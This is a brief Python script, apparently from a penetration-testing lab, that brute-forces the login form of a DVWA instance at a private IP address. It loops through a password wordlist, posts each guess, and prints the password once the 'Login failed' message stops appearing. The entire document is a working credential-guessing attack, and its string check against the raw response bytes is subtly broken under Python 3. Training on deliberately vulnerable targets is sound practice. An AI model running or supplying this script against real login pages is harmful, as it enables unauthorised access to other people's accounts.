import requests


target_url = "http://10.0.2.20/dvwa/login.php"
#data dict for taking the values for the input function specifying for each parameter

data_dict = {"username": "admin", "password": "password", "Login": "submit"}


#sending the post requests to the target website

#showing the html code for the target page



with open("/root/Downloads/password.list", "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data= data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + word)
            exit()

print("[+] Reached end of line")